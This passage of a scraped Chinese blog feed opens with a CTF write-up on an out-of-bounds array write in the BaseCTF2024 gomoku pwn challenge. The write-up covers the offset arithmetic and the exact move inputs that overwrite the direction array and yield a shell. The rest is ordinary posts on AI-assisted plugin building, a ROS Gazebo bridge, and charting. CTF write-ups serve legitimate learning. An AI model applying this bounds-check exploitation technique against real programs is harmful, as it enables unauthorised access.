过思路大概就是这样，效果如下<br />\n<img alt=\"5IQ7YA{1KO8@%}O53GIFQXL\" class=\"lazyload\" /></p>\n<h2 id=\"数组越界\">数组越界</h2>\n<p>数组越界顾名思义，也就是访问数组时索引超出定义范围，可能导致程序访问非法内存。比如我定义一个数组a[10]，然后后面有a[i]但i却能等于10，这就越界了。如果他检查i范围检查的不细致（没检查上界或下界）就可以实现几乎任意地址访问，那具体访问的地址是什么地址的呢？这就得有一些c语言基础了，在c语言中我们知道a[1]=*(a+1)这样我们的a[i]其实就是 *(a+i)假如i可以控制，或者a+i这个地址就是我们想改的地址，那么我们就可以访问到这个地址的内存，就很有可能可以进行修改。具体的地址运算就要看该数组的定义，int就是4字节定义，假如int a[10]那a地址与a+1地址就差4，char就差1，double就差8，二维数组也一样，二维数组可以看成一维数组的数组，比如int a[10] [10]，相当于把a[10]又看成一个数组的元素，那a[1]距离a就差10个int，也就是40。还不懂的话可以去看看c语言，下面我们看题。</p>\n<h4 id=\"basectf2024新生赛五子棋\">BaseCTF2024新生赛五子棋</h4>\n<p>这题其实9分逆向1分pwn，逆向出来了基本就写完了，不过我们还是老规矩先checksec<br />\n<img alt=\"AHGT0C`N8%FTZZHROPA}GA\" class=\"lazyload\" /></p>\n<p>然后去ida看看<br />\n<img alt=\"1BR8%BU`Y3$LHVL45_LDO\" class=\"lazyload\" /></p>\n<p>这里既然是五子棋，那肯定要有这几个模块，打印地图，玩家下棋，另一方下棋，检查，获胜。简单逆向一下，这里逻辑就是首先展示地图，然后用户先下，判断用户是否赢，没赢就递归调用game函数把a1改成1让if为真，进而让电脑下棋，然后判断电脑有没有赢，然后把a1改成0让用户再下，只要我们的下两颗棋就获胜就给我们shell，显然这样直接下不可能获得shell，所以一定有某个漏洞。</p>\n<p><img alt=\"13OB90LPMQE$QMFA58{{B$1\" class=\"lazyload\" /></p>\n<p>这里漏洞在用户下棋那里<br />\n<img alt=\"QFWDFOKY%HT2OQ06@8CKD\" class=\"lazyload\" /></p>\n<p>这里有数组越界，不过运用的时候要注意因为地图其实里面一开始都是数字-1，所以我们只能在数字为-1的地方改数值，改成这个0，接下来我们看判断输赢的函数。</p>\n<p>这里我们可以看见，这里四个循环，而这个x数组和y数组配合起来应该就是一个方向数组，通过n7的循环让这两个数组组合实现标定方向，n5的循环在遍历8个方向的棋子，n19_3与n19_2的组合就是遍历整个地图找标点，后面n7与n5就是在这个标点上延伸8个方向，如果有一次没找到对应棋子就断开这一次n5的循环换一个方向再找（也就是五子棋没连起来五个子），如果能找到五个（遍历五次）就判断获胜。我们可以看看这个方向向量的数组<br />\n<img alt=\"OMY$C@ROM(2T1I2HJN~SDS\" class=\"lazyload\" /></p>\n<p>这个dd就是定义双字的意思define doubleword，双字就是4个字节，也就是int的意思。其中2  dup(0)就是0重复两次，0FFFFFFFFh这里h就是16进制的意思，其实就是0xFFFFFFFF，这个就是-1的补码形式，数组内容如下</p>\n<pre><code>y ：0 0 1 -1 1 -1 1 -1\nx : 1 -1 0 0 1 -1 -1 1\n</code></pre>\n<p>因为小端序所以他们的地址就是从左到右就是依次由0x4020去+4。到这里这个题就差不多结束了，因为我们用户输入能把-1变成0，这里我们要么选0x402c这个地址把这个-1变成0，这样xy组合的方向向量就变成(0,0)了，相当于这个地方延伸的五个方向都是他自己，实现检查自己五次，那就可以实现两颗棋子获胜了（也就是第二颗棋子下在方向数组里了哈哈），要么我们选把0x4044这个地址的-1变成0，这些都可以。接下来我们算我们地图数组到方向数组的偏移<br />\n<img alt=\"KF%FKN`58RO2DF_UMIL5JO1\" class=\"lazyload\" /></p>\n<p>地图数组的起始位置是0x9D60而且他也是int，以0x4044为例，到这的偏移就是0x9D60-0x4044也就是0x5D1C也就是十进制的23836我们知道int代表4字节，23836也就是5,959个偏移，也就是我们需要map[-5959]就能改到这个位置实现把方向向量改成(0,0)，我们下棋是这样下的<br />\nmap[20 * n19 + n19_1]=0，所以就随便搭配一下n19和n19_1凑出来-5959就可以了，这里注意n19，n19_1不能大于19就可以了，比如-298*20  1<br />\n或者-297 *20  -19都可以。这样我们只需要nc上去，先随便下一个地方，再输入-298 1或者-297 -19就getshell了。效果如下。<br />\n<img alt=\"IX4X{`$K@{BILRR~N4HWRU\" class=\"lazyload\" /></p>\n<p><img alt=\"09NCIA80SBA}{@1)(R7IAU\" class=\"lazyload\" /></p>\n<p><img alt=\"R6ISE2(U50D_B%M2_XEW0\" class=\"lazyload\" /></p>\n<p>这题感觉设计的挺好的，有点意思，虽然逆向了我好久...</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 20:04</span>&nbsp;\n<a href=\"https://www.cnblogs.com/firefly-star\">firefly_star</a>&nbsp;\n阅读(<span id=\"post_view_count\">28</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "告别代码！我用Trae氛围编程的方式，开发了一款公众号文章同步插件！",
      "link": "https://www.cnblogs.com/chingho/p/19498962",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n\t\t\t<a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/chingho/p/19498962\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 19:02\">\n    <span>告别代码！我用Trae氛围编程的方式，开发了一款公众号文章同步插件！</span>\n    \n\n</a>\n\n\t\t</h1>\n\t\t<div class=\"clear\"></div>\n\t\t<div class=\"postBody\">\n\t\t\t    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        大家好，我是编程乐趣。我利用周末时间，没有写任何一行代码，用Trae氛围编程的方式，完成一个浏览器插件的开发。最大的感受是，未来编程方式，对阅读代码、代码语法、编程语言等能力变得不再重要，懂得与AI对方才是最重要的能力。下面和大家分享下，我开发这款插件的完整过程与感受。该插件我已经在Github开源了，大家自行文末获取。一、插件产品介绍# 产品简介\n\n一个浏览器插件，用于在公众号文章页面自动显示同...\n    </div>\n<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p><span>大家好，我是编程乐趣。</span><span>我利用周末时间，<span>没有写任何一行代码，<span>用Trae氛围编程的方式，<span>完成一个浏览器插件的开发。</span></span></span></span><span><span>最大的感受是，未来编程方式，对阅读代码、代码语法、编程语言等能力变得不再重要，懂得与AI对方才是最重要的能力。</span></span><span>下面和大家分享下，我开发这款插件的完整过程与感受。</span></p>\n<p><strong>该插件我已经在Github开源了，大家自行文末获取。</strong></p>\n<p>&nbsp;</p>\n<p><strong>一、插件产品介绍</strong></p>\n<p><strong># 产品简介</strong></p>\n<p>一个浏览器插件，用于在公众号文章页面自动显示同步按钮，支持一键同步到多个平台。</p>\n<img alt=\"图片\" class=\"rich_pages wxw-img\" src=\"https://img2024.cnblogs.com/blog/93789/202601/93789-20260118190024657-790542621.png\" />\n<p><strong># 功能特性</strong></p>\n<p>-&nbsp;📤 在公众号文章页面自动注入同步按钮</p>\n<p>-&nbsp;🔄 支持一键同步到多个平台</p>\n<p>-&nbsp;✅ 支持平台勾选选择</p>\n<p>-&nbsp;🎨 美观易用的UI界面</p>\n<p><strong># 当前支持的平台</strong></p>\n<p>-&nbsp;📝 CSDN</p>\n<p>-&nbsp;🏫 博客园</p>\n<p>-&nbsp;🧠 知乎</p>\n<p>-&nbsp;📰 今日头条</p>\n<p><span>&nbsp;</span></p>\n<p><strong>二、开发完整步骤流程</strong></p>\n<p><span><span>由于开发过程中，没有截图，我只能通过文字来和大家分享。</span></span></p>\n<span><span>1、我告诉Trae，我要开发一款公众号文章同步浏览器插件，并罗列要支持的平台、需要完成的功能。</span></span><span><span>Trae：可以完整生成插件代码，同时会生成logo图片的配置信息。但没有生成logo图片。</span></span><img alt=\"图片\" class=\"rich_pages wxw-img\" src=\"https://img2024.cnblogs.com/blog/93789/202601/93789-20260118190024519-1701600050.png\" /><span><span>2、<span>我告诉Trae，帮我生成一个logo图片，用于做这个浏览器插件图标。这个产品我取名为：OneClick，<span>设计要求：<span>logo用产品名、绿色背景。</span></span></span></span></span><img alt=\"图片\" class=\"rich_pages wxw-img\" src=\"https://img2024.cnblogs.com/blog/93789/202601/93789-20260118190024555-1868309316.png\" /><span><span>Trae：<span><br /></span></span></span>\n<ul class=\"list-paddingleft-1\">\n<li><span>Trae会检测我电脑环境是否安装node，并使用node生成logo图片，但执行过程中发现我node版本过低，提示我要安装node相关插件。</span></li>\n<li><span>我电脑有安装多个node版本，Trae没有检测我电脑是否存在多个版本，直接提示我缺少相关插件，并给出<span>确认按钮，问我是否要安装插件，这边需要我人工点击确认。</span></span></li>\n<li><span><span>我点击确认后，Trade自动生成logo.svg文件，并根据要求生成不同尺寸的logo文件。</span></span></li>\n\n\n\n</ul>\n\n\n\n<span><br /></span><span><span>3、<span>完成以上步骤后，我把插件导入到Chrome浏览器，并尝试运行。<span>结果并不能完整运行。</span></span></span></span>\n<ul class=\"list-paddingleft-1\">\n<li><span>插件实现方式，打开不同标签页面，并自动填充标题、内容。有部分平台可以正确填充，有些不行。</span></li>\n\n\n\n</ul>\n\n\n\n<span><br /></span><span><span>4、<span>我告诉Trae，<span>不要使用打开不同标签页面的方式<span>，改为后台自动运行的方式。</span></span></span></span></span><span><span>Trae<span>：可以正确理解我要使用ApI的方式，并进行修改。</span></span></span><span><br /></span><span><span>5、完成修改后，我进行测试，依然是无法完成同步。</span></span><span><span>6、<span>接下去的几轮对话中，<span>我不断告诉Trae，同步功能有问题，插件界面有显示同步错误情况，我也把错误情况发送给Trae<span>，Trae也不断的进行代码修改，最终也是不能实现。</span></span></span></span></span><span><span>7、<span>我做了一个改变，查看浏览器的运行日志。并把更详细错误日志发送给Trae。Trae根据更详细日志，也修复几个Bug，但并不能完整实现同步功能。</span></span></span><span><span>8、<span>经过好几轮的对话，并不能实现我想要的功能，<span>我于是让Trae打印更详细的日志，方便我给她反馈<span>。Trae修改代码，并打印更详细的日志。</span></span></span></span></span><img alt=\"图片\" class=\"rich_pages wxw-img\" src=\"https://img2024.cnblogs.com/blog/93789/202601/93789-20260118190024519-743493286.webp\" /><span><span>9<span>、继续经过好几轮对话，还是不能正确实现功能。通过日志查看，Trae提交的API，并不是正确的。<span>这个是由于各个平台，并没有公开的API文档<span>，所以Trae是通过搜索网络文档和猜测的方式，不断修改代码。</span></span></span></span></span><span><span>10、<span>由于不能实现功能，我只能是到各个平台，手动操作保存文章草稿，并通过浏览器插件，提取相关的接口Url、请求标头、提交报文等信息。</span></span></span>\n<ul class=\"list-paddingleft-1\">\n<li><span>有些平台支持markdown、有些只能是富文本形式。</span></li>\n<li><span>提取图片上传接口、保存草稿的接口的相关报文。</span></li>\n\n\n\n</ul>\n<p>\n\n<span><br /></span><img alt=\"图片\" class=\"rich_pages wxw-img\" src=\"https://img2024.cnblogs.com/blog/93789/202601/93789-20260118190024613-576081230.webp\" /><span><span>11<span>、通过我给的报文，插件可以正确提交，但都提示未登录、或者没权限。我告诉Trae，分别先访问各个平台后台（我整理各个平台后台Url），并获取Cookie并由于接口提交。</span></span></span><span><span>12<span>、通过以上的方式，并结合打印的日志，我不同让Trae调整，最终完整实现功能。</span></span></span><span><br /></span></p>\n<p><strong><span>三、开发总结</span></strong></p>\n<p><span><span>1、在这过程中，我没有手动<span>编写任何一行代码<span>。</span></span></span></span></p>\n<p><span><span>2、不再需要阅读代码，<span>只要把错误日志反馈给AI，AI就能正确的修改<span>。</span></span></span></span></p>\n<p><span><span>3、过程中，一直无法实现功能，<span>记得要求AI打印更详细的日志<span>，<span>方便我们给AI反馈。</span></span></span></span></span></p>\n<p><span><span>4、虽然不用编写代码、阅读代码，但<span>对实现原理还要知道的<span>。否则，我就不懂通过查看浏览器报文的形式，给AI反馈了。</span></span></span></span></p>\n<p><span><span>最后<span>，现在对程序员的要求已经完全变了。代码语法、代码规范、编程语言等过去要求的能力，变得越来越不重要了。</span></span></span><span><span>你只需懂得各种原理、各种知识点的概念，就能实现开发了。</span></span></p>\n<p><span><br /></span><strong>四、插件下载</strong></p>\n<p><span><span>代码我已经提交到Github，大家可以自行下载，或者网盘下载。</span></span></p>\n<p><span><span>开源项目：<span><br /></span></span></span><span>https://github.com/bianchenglequ/OneClick</span></p>\n<p><span><span>网盘下载：<span><br /></span></span></span><span>https://pan.quark.cn/s/9ef2717f5203</span></p>\n</div>\n<div class=\"clear\"></div>\n\n\t\t</div>\n\t\t<div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 19:02</span>&nbsp;\n<a href=\"https://www.cnblogs.com/chingho\">chingho</a>&nbsp;\n阅读(<span id=\"post_view_count\">64</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "ROS1 noetic 中将 Unitree G1 基于 Gazebo/RViz 关节联动【基于 Gazebo 状态反馈】",
      "link": "https://www.cnblogs.com/zylyehuo/p/19498596",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/zylyehuo/p/19498596\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 15:37\">\n    <span>ROS1 noetic 中将 Unitree G1 基于 Gazebo/RViz 关节联动【基于 Gazebo 状态反馈】</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<blockquote>\n<p>博客地址：<a href=\"https://www.cnblogs.com/zylyehuo/\" target=\"_blank\">https://www.cnblogs.com/zylyehuo/</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://github.com/unitreerobotics/unitree_ros/tree/master/robots/g1_description\" rel=\"noopener nofollow\" target=\"_blank\">Unitree G1 模型文件下载地址(挑选自己需要的部分，本教程基于 g1_29dof.urdf (以及 .xml 和 meshes 文件夹))</a></p>\n</blockquote>\n<blockquote>\n<p>有核心的 URDF 文件和 Meshes (STL 网格文件)</p>\n</blockquote>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3071480/202601/3071480-20260113204337327-270675226.png\" /></p>\n<blockquote>\n<p>为 Gazebo 中模型添加颜色参考：<a href=\"https://www.cnblogs.com/zylyehuo/p/19479129\" target=\"_blank\">ROS1 noetic 中将 Unitree G1 的 URDF 导入 Gazebo/RViz</a></p>\n</blockquote>\n<blockquote>\n<p>并非基于传统的 ros_control（通过插件控制关节），而是通过 Gazebo 状态反馈 -&gt; 计算位姿 -&gt; 映射到 TF 和 JointState 的方式实现的。</p>\n</blockquote>\n<ul>\n<li>该系统跳过了 ros_control 控制器。</li>\n<li>向 /joint_commands 发送 JointState 消息时，脚本会调用 Gazebo 的 /gazebo/set_model_configuration 服务。</li>\n<li>这个服务直接“强行”设置 Gazebo 中物理模型的关节位置，类似于瞬移，而不是施加力矩。在调试规划算法时非常高效。</li>\n</ul>\n<h1 id=\"效果预览\">效果预览</h1>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3071480/202601/3071480-20260118152755660-1755629437.png\" /></p>\n<h1 id=\"工作空间结构\">工作空间结构</h1>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3071480/202601/3071480-20260118161444336-1800514403.png\" /></p>\n<h1 id=\"主要文件\">主要文件</h1>\n<h2 id=\"display_and_gazebolaunch\">display_and_gazebo.launch</h2>\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;launch&gt;\n  &lt;!-- 加载机器人URDF模型参数 --&gt;\n  &lt;param name=\"robot_description\" textfile=\"$(find g1_description)/urdf/g1_29dof.urdf\" /&gt;\n\n  &lt;!-- TF静态变换 --&gt;\n  &lt;node pkg=\"tf\" type=\"static_transform_publisher\" name=\"world_to_map\" args=\"0 0 0  0 0 0 1  world map 10\"/&gt;\n  &lt;!-- NOTE: removed static base_link-&gt;pelvis to avoid TF duplication; link_states_bridge publishes dynamic map-&gt;base_link --&gt;\n  &lt;node pkg=\"tf\" type=\"static_transform_publisher\" name=\"imu_in_torso2body_imu\" args=\"0.0  0.0  0.0   0.0 0.0 0.0 1  imu_in_torso body_imu 100\" /&gt;\n  &lt;!-- NOTE: keep base_link-&gt;pelvis as a static zero transform so pelvis and base_link coincide --&gt;\n  &lt;node pkg=\"tf\" type=\"static_transform_publisher\" name=\"base_link2pelvis\" args=\"0 0 0  0 0 0 1  base_link pelvis 100\" /&gt;\n\n  &lt;!-- 机器人状态发布器 --&gt;\n  &lt;node name=\"robot_state_publisher\" pkg=\"robot_state_publisher\" type=\"robot_state_publisher\" /&gt;\n\n  &lt;!-- LinkStates到JointState的桥接，同时发布动态TF和处理关节命令 --&gt;\n  &lt;node name=\"link_states_bridge\" pkg=\"g1_description\" type=\"link_states_bridge.py\" output=\"screen\" /&gt;\n\n  &lt;!-- RViz --&gt;\n  &lt;node name=\"rviz\" pkg=\"rviz\" type=\"rviz\" respawn=\"false\" output=\"screen\" /&gt;\n\n  &lt;!-- ============ Gazebo配置 ============ --&gt;\n  &lt;!-- 启动Gazebo --&gt;\n  &lt;include file=\"$(find gazebo_ros)/launch/empty_world.launch\"&gt;\n    &lt;arg name=\"paused\" value=\"false\"/&gt;\n    &lt;arg name=\"use_sim_time\" value=\"true\"/&gt;\n    &lt;arg name=\"gui\" value=\"true\"/&gt;\n    &lt;arg name=\"headless\" value=\"false\"/&gt;\n  &lt;/include&gt;\n\n  &lt;!-- 将机器人模型生成到Gazebo中 --&gt;\n  &lt;node name=\"spawn_urdf\" pkg=\"gazebo_ros\" type=\"spawn_model\" \n    args=\"-param robot_description -urdf -z 0.79 -model g1_robot\" \n    output=\"screen\" /&gt;\n\n  &lt;!-- NOTE: controller parameters loading removed to avoid conflicts; using bridge(set_model_configuration) instead --&gt;\n\n&lt;/launch&gt;\n\n</code></pre>\n<h2 id=\"link_states_bridgepy\">link_states_bridge.py</h2>\n<pre><code class=\"language-python\">#!/usr/bin/env python3\n\nimport rospy\nimport math\nfrom gazebo_msgs.msg import LinkStates\nfrom sensor_msgs.msg import JointState\nfrom std_msgs.msg import Float64\nimport numpy as np\nfrom scipy.spatial.transform import Rotation\nimport threading\nimport tf\nfrom geometry_msgs.msg import TransformStamped\nfrom gazebo_msgs.srv import SetModelConfiguration\n\nclass LinkStatesToJointState:\n    def __init__(self):\n        rospy.init_node('link_states_to_joint_state')\n        \n        # 订阅Gazebo的链接状态\n        self.link_states_sub = rospy.Subscriber('/gazebo/link_states', LinkStates, self.link_states_callback, queue_size=1)\n        \n        # 订阅关节命令话题（用于控制Gazebo中的关节）\n        self.joint_cmd_sub = rospy.Subscriber('/joint_commands', JointState, self.joint_cmd_callback, queue_size=1)\n        \n        # 发布joint_states\n        self.joint_states_pub = rospy.Publisher('/joint_states', JointState, queue_size=1)\n        \n        # 发布TF变换\n        self.tf_broadcaster = tf.TransformBroadcaster()\n        \n        # 所有关节及其parent/child链接映射\n        self.joints_info = {\n            'left_hip_pitch_joint': ('pelvis', 'left_hip_pitch_link', [0, 1, 0]),\n            'left_hip_roll_joint': ('left_hip_pitch_link', 'left_hip_roll_link', [1, 0, 0]),\n            'left_hip_yaw_joint': ('left_hip_roll_link', 'left_hip_yaw_link', [0, 0, 1]),\n            'left_knee_joint': ('left_hip_yaw_link', 'left_knee_link', [0, 1, 0]),\n            'left_ankle_pitch_joint': ('left_knee_link', 'left_ankle_pitch_link', [0, 1, 0]),\n            'left_ankle_roll_joint': ('left_ankle_pitch_link', 'left_ankle_roll_link', [1, 0, 0]),\n            'right_hip_pitch_joint': ('pelvis', 'right_hip_pitch_link', [0, 1, 0]),\n            'right_hip_roll_joint': ('right_hip_pitch_link', 'right_hip_roll_link', [1, 0, 0]),\n            'right_hip_yaw_joint': ('right_hip_roll_link', 'right_hip_yaw_link', [0, 0, 1]),\n            'right_knee_joint': ('right_hip_yaw_link', 'right_knee_link', [0, 1, 0]),\n            'right_ankle_pitch_joint': ('right_knee_link', 'right_ankle_pitch_link', [0, 1, 0]),\n            'right_ankle_roll_joint': ('right_ankle_pitch_link', 'right_ankle_roll_link', [1, 0, 0]),\n            'waist_yaw_joint': ('pelvis', 'waist_yaw_link', [0, 0, 1]),\n            'waist_roll_joint': ('waist_yaw_link', 'waist_roll_link', [1, 0, 0]),\n            'waist_pitch_joint': ('waist_roll_link', 'torso_link', [0, 1, 0]),\n            'left_shoulder_pitch_joint': ('torso_link', 'left_shoulder_pitch_link', [0, 1, 0]),\n            'left_shoulder_roll_joint': ('left_shoulder_pitch_link', 'left_shoulder_roll_link', [1, 0, 0]),\n            'left_shoulder_yaw_joint': ('left_shoulder_roll_link', 'left_shoulder_yaw_link', [0, 0, 1]),\n            'left_elbow_joint': ('left_shoulder_yaw_link', 'left_elbow_link', [0, 1, 0]),\n            'left_wrist_roll_joint': ('left_elbow_link', 'left_wrist_roll_link', [1, 0, 0]),\n            'left_wrist_pitch_joint': ('left_wrist_roll_link', 'left_wrist_pitch_link', [0, 1, 0]),\n            'left_wrist_yaw_joint': ('left_wrist_pitch_link', 'left_wrist_yaw_link', [0, 0, 1]),\n            'right_shoulder_pitch_joint': ('torso_link', 'right_shoulder_pitch_link', [0, 1, 0]),\n            'right_shoulder_roll_joint': ('right_shoulder_pitch_link', 'right_shoulder_roll_link', [1, 0, 0]),\n            'right_shoulder_yaw_joint': ('right_shoulder_roll_link', 'right_shoulder_yaw_link', [0, 0, 1]),\n            'right_elbow_joint': ('right_shoulder_yaw_link', 'right_elbow_link', [0, 1, 0]),\n            'right_wrist_roll_joint': ('right_elbow_link', 'right_wrist_roll_link', [1, 0, 0]),\n            'right_wrist_pitch_joint': ('right_wrist_roll_link', 'right_wrist_pitch_link', [0, 1, 0]),\n            'right_wrist_yaw_joint': ('right_wrist_pitch_link', 'right_wrist_yaw_link', [0, 0, 1]),\n        }\n        \n        # Gazebo set_model_configuration 服务代理（用于直接设置关节位置，替代ros_control）\n        rospy.wait_for_service('/gazebo/set_model_configuration')\n        self.set_model_config = rospy.ServiceProxy('/gazebo/set_model_configuration', SetModelConfiguration)\n        \n        self.last_msg = None\n        self.lock = threading.Lock()\n        self.initial_pelvis_z = None  # 初始pelvis高度\n\n        # TF 发布节流参数\n        self.last_tf_time = rospy.Time(0)\n        self.tf_min_interval = rospy.Duration(0.05)  # 最小间隔 50ms\n        self.last_pelvis_pose = None\n        self.tf_pos_thresh = 0.005   # 5mm\n        self.tf_rot_thresh = 0.01    # ~0.57deg\n        \n        rospy.loginfo(\"Link States to Joint State Bridge initialized\")\n        rospy.loginfo(\"Now using /gazebo/set_model_configuration to apply joint commands\")\n        rospy.loginfo(\"Publish JointState to /joint_commands to control joints\")\n    \n    def link_states_callback(self, msg):\n        with self.lock:\n            self.last_msg = msg\n            self.publish_joint_states(msg)\n            self.publish_dynamic_tf(msg)\n    \n    def joint_cmd_callback(self, msg):\n        \"\"\"订阅关节命令话题，使用Gazebo服务设置关节位置（不依赖URDF transmission）\"\"\"\n        try:\n            if not msg.name or not msg.position:\n                rospy.logwarn(\"Received empty joint command\")\n                return\n            # 调用服务设置关节位置\n            model_name = 'g1_robot'\n            urdf_param_name = 'robot_description'\n            joint_names = list(msg.name)\n            joint_positions = list(msg.position)\n            rospy.loginfo(f\"Setting joints via service: {joint_names} -&gt; {joint_positions}\")\n            self.set_model_config(model_name, urdf_param_name, joint_names, joint_positions)\n        except Exception as e:\n            rospy.logerr(f\"Failed to call set_model_configuration: {e}\")\n    \n    def get_link_index(self, link_name, msg):\n        \"\"\"获取链接在LinkStates中的索引\"\"\"\n        full_name = f'g1_robot::{link_name}'\n        try:\n            return msg.name.index(full_name)\n        except ValueError:\n            return -1\n    \n    def get_relative_rotation(self, parent_pose, child_pose):\n        \"\"\"计算从parent到child的相对旋转（四元数）\"\"\"\n        p_quat = [parent_pose.orientation.x, parent_pose.orientation.y, \n                  parent_pose.orientation.z, parent_pose.orientation.w]\n        c_quat = [child_pose.orientation.x, child_pose.orientation.y, \n                  child_pose.orientation.z, child_pose.orientation.w]\n        \n        p_rot = Rotation.from_quat(p_quat)\n        c_rot = Rotation.from_quat(c_quat)\n        \n        rel_rot = p_rot.inv() * c_rot\n        \n        return rel_rot\n    \n    def rotation_to_angle_around_axis(self, rotation, axis):\n        angle = rotation.magnitude()\n        \n        if abs(angle) &lt; 1e-6:\n            return 0.0\n        \n        rotvec = rotation.as_rotvec()\n        rot_axis = rotvec / angle if angle &gt; 1e-6 else [0, 0, 1]\n        \n        axis_norm = np.array(axis) / np.linalg.norm(axis)\n        \n        if np.dot(rot_axis, axis_norm) &gt; 0.9:\n            return angle\n        elif np.dot(rot_axis, axis_norm) &lt; -0.9:\n            return -angle\n        else:\n            euler = rotation.as_euler('xyz')\n            if axis == [1, 0, 0]:\n                return euler[0]\n            elif axis == [0, 1, 0]:\n                return euler[1]\n            elif axis == [0, 0, 1]:\n                return euler[2]\n            else:\n                return 0.0\n    \n    def publish_joint_states(self, msg):\n        joint_state = JointState()\n        joint_state.header.stamp = rospy.Time.now()\n        joint_state.name = list(self.joints_info.keys())\n        joint_state.position = []\n        joint_state.velocity = [0.0] * len(joint_state.name)\n        joint_state.effort = [0.0] * len(joint_state.name)\n        \n        for joint_name, (parent_name, child_name, axis) in self.joints_info.items():\n            parent_idx = self.get_link_index(parent_name, msg)\n            child_idx = self.get_link_index(child_name, msg)\n            \n            if parent_idx &lt; 0 or child_idx &lt; 0:\n                joint_state.position.append(0.0)\n                continue\n            \n            rel_rot = self.get_relative_rotation(msg.pose[parent_idx], msg.pose[child_idx])\n            angle = self.rotation_to_angle_around_axis(rel_rot, axis)\n            \n            joint_state.position.append(angle)\n        \n        self.joint_states_pub.publish(joint_state)\n    \n    def publish_dynamic_tf(self, msg):\n        pelvis_idx = self.get_link_index('pelvis', msg)\n\n        if pelvis_idx &lt; 0:\n            return\n\n        pelvis_pose = msg.pose[pelvis_idx]\n\n        # 节流逻辑\n        now = rospy.Time.now()\n        if self.last_pelvis_pose is not None:\n            pos_diff = np.linalg.norm([\n                pelvis_pose.position.x - self.last_pelvis_pose.position.x,\n                pelvis_pose.position.y - self.last_pelvis_pose.position.y,\n                pelvis_pose.position.z - self.last_pelvis_pose.position.z\n            ])\n            rot_diff = Rotation.from_quat([\n                pelvis_pose.orientation.x, pelvis_pose.orientation.y,\n                pelvis_pose.orientation.z, pelvis_pose.orientation.w\n            ]).inv() * Rotation.from_quat([\n                self.last_pelvis_pose.orientation.x, self.last_pelvis_pose.orientation.y,\n                self.last_pelvis_pose.orientation.z, self.last_pelvis_pose.orientation.w\n            ])\n            rot_diff_angle = rot_diff.magnitude()\n\n            if pos_diff &lt; self.tf_pos_thresh and rot_diff_angle &lt; self.tf_rot_thresh and (now - self.last_tf_time) &lt; self.tf_min_interval:\n                return\n\n        self.last_tf_time = now\n        self.last_pelvis_pose = pelvis_pose\n\n        translation = (pelvis_pose.position.x, pelvis_pose.position.y, pelvis_pose.position.z)\n        rotation_q = (pelvis_pose.orientation.x, pelvis_pose.orientation.y, pelvis_pose.orientation.z, pelvis_pose.orientation.w)\n\n        # 只发布 map -&gt; base_link，让 base_link-&gt;pelvis 由静态发布器（launch）处理\n        self.tf_broadcaster.sendTransform(\n            translation=translation,\n            rotation=rotation_q,\n            time=rospy.Time.now(),\n            child='base_link',\n            parent='map'\n        )\n\nif __name__ == '__main__':\n    try:\n        node = LinkStatesToJointState()\n        rospy.spin()\n    except rospy.ROSInterruptException:\n        pass\n\n</code></pre>\n<h1 id=\"运行步骤\">运行步骤</h1>\n<pre><code>cd ~/g1_test_ws\n</code></pre>\n<pre><code>catkin_make\n</code></pre>\n<pre><code>source ./devel/setup.bash\n</code></pre>\n<pre><code>roslaunch g1_description display_and_gazebo.launch\n</code></pre>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 15:37</span>&nbsp;\n<a href=\"https://www.cnblogs.com/zylyehuo\">zylyehuo</a>&nbsp;\n阅读(<span id=\"post_view_count\">24</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "打破堆积困局：优化堆积条形图的对比效果",
      "link": "https://www.cnblogs.com/wang_yb/p/19498573",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/wang_yb/p/19498573\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 15:25\">\n    <span>打破堆积困局：优化堆积条形图的对比效果</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>在数据可视化中，<strong>堆积条形图</strong> 擅长展示 <strong>“整体与构成”</strong> 的关系，但当每个柱子内的分段超过4个时，读者很难同时追踪各段的长度、位置与颜色映射， <strong>误读概率显著上升</strong>。</p>\n<p>更糟的是，若不同类别的总量差异很大，堆积结构会放大视觉错觉，导致“看起来差不多”的结论失真。</p>\n<p>今天，本文将尝试探索一下改进堆积条形图的呈现方式，让复杂数据对比变得一目了然。</p>\n<p>如果大家有更好的方式，也欢迎指教，交流。<strong>完整的代码</strong>会在文末提供共享的地址。</p>\n<h1 id=\"1-堆积条形图的困境\">1. 